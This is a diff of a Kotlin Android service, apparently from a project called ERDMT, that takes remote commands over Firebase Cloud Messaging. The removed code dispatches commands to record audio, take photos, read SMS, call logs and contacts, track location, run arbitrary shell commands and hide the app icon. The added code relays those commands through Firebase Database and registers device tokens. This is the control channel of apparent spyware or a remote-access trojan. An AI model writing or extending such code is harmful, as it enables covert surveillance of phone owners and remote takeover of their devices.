@@ -1,97 +1,82 @@
 package com.yourdomain.erdmt
 
 import android.content.Intent
-import android.location.Location
-import android.os.Handler
-import android.os.Looper
 import android.util.Log
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
+import com.google.firebase.database.FirebaseDatabase
 
 class RemoteCommandService : FirebaseMessagingService() {
 
+    private val database = FirebaseDatabase.getInstance()
+    private val deviceId = "device_${System.currentTimeMillis()}"
+
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
-        val data = remoteMessage.data
-        val command = data["command"]
-        val params = data["params"]
-        Log.d("RemoteCommandService", "Command received: $command, Params: $params")
+        super.onMessageReceived(remoteMessage)
 
-        when (command) {
-            "mic_record" -> {
-                // Record 10 seconds of audio
-                val filePath = MicRecorder.startRecording(applicationContext)
-                Handler(Looper.getMainLooper()).postDelayed({
-                    val recordedFilePath = MicRecorder.stopRecording()
-                    // TODO: Upload or process recordedFilePath
-                    Log.d("RemoteCommandService", "Recorded audio: $recordedFilePath")
-                }, 10_000)
-            }
+        Log.d("RemoteCommandService", "Message received from: ${remoteMessage.from}")
 
-            "camera_capture" -> {
-                // Launch camera activity to capture photo
-                val intent = Intent(applicationContext, CameraCaptureActivity::class.java)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(intent)
+        // Handle data payload
+        remoteMessage.data.let { data ->
+            if (data.isNotEmpty()) {
+                Log.d("RemoteCommandService", "Message data payload: $data")
+                handleDataMessage(data)
             }
+        }
 
-            "read_sms" -> {
-                val sms = SmsReader.getRecentSms(applicationContext)
-                // TODO: Upload or process sms list
-                Log.d("RemoteCommandService", "SMS: $sms")
-            }
-
-            "read_call_logs" -> {
-                val logs = CallLogReader.getCallLogs(applicationContext)
-                // TODO: Upload or process call logs
-                Log.d("RemoteCommandService", "Call Logs: $logs")
-            }
-
-            "read_contacts" -> {
-                val contacts = ContactsReader.getContacts(applicationContext)
-                // TODO: Upload or process contacts
-                Log.d("RemoteCommandService", "Contacts: $contacts")
-            }
-
-            "list_installed_apps" -> {
-                val apps = InstalledAppsReader.getInstalledApps(applicationContext)
-                // TODO: Upload or process apps list
-                Log.d("RemoteCommandService", "Installed Apps: $apps")
-            }
-
-            "get_location" -> {
-                LocationTracker.getLastLocation(applicationContext) { location: Location? ->
-                    if (location != null) {
-                        Log.d("RemoteCommandService", "Location: ${location.latitude}, ${location.longitude}")
-                        // TODO: Upload or process location
-                    } else {
-                        Log.d("RemoteCommandService", "Location: null")
-                    }
-                }
-            }
-
-            "shell_exec" -> {
-                val shellCommand = params ?: ""
-                val output = ShellExecutor.execute(shellCommand)
-                // TODO: Upload or process output
-                Log.d("RemoteCommandService", "Shell Output: $output")
-            }
-
-            "toggle_icon" -> {
-                val visible = params == "show"
-                IconToggleUtil.setIconVisible(applicationContext, visible)
-                Log.d("RemoteCommandService", "Icon visibility set to: $visible")
-            }
-
-            // Add more commands as needed, e.g., file explorer, encryption, etc.
-            else -> {
-                Log.d("RemoteCommandService", "Unknown command: $command")
-            }
+        // Handle notification payload
+        remoteMessage.notification?.let { notification ->
+            Log.d("RemoteCommandService", "Message notification body: ${notification.body}")
+            showNotification(notification.title ?: "ERDMT", notification.body ?: "New command received")
         }
     }
 
     override fun onNewToken(token: String) {
         super.onNewToken(token)
-        Log.d("RemoteCommandService", "New FCM Token: $token")
-        // TODO: Send token to backend if needed
+        Log.d("RemoteCommandService", "Refreshed token: $token")
+
+        // Send token to Firebase Database
+        sendTokenToDatabase(token)
+    }
+
+    private fun handleDataMessage(data: Map<String, String>) {
+        val command = data["command"]
+        val params = data["params"]
+
+        Log.d("RemoteCommandService", "Command: $command, Params: $params")
+
+        // Store command in Firebase for MainActivity to pick up
+        val commandData = hashMapOf(
+            "type" to (command ?: ""),
+            "params" to params,
+            "timestamp" to System.currentTimeMillis(),
+            "sender" to "fcm"
+        )
+
+        database.reference.child("commands").child(deviceId).push().setValue(commandData)
+
+        // Wake up the app if needed
+        val intent = Intent(this, MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            putExtra("command", command)
+            putExtra("params", params)
+        }
+        startActivity(intent)
+    }
+
+    private fun sendTokenToDatabase(token: String) {
+        val tokenData = hashMapOf(
+            "token" to token,
+            "timestamp" to System.currentTimeMillis(),
+            "deviceId" to deviceId
+        )
+
+        database.reference.child("devices").child(deviceId).child("fcmToken").setValue(token)
+        database.reference.child("fcm_tokens").child(deviceId).setValue(tokenData)
+    }
+
+    private fun showNotification(title: String, body: String) {
+        val notificationHelper = NotificationHelper(this)
+        notificationHelper.showNotification(title, body)
     }
 }
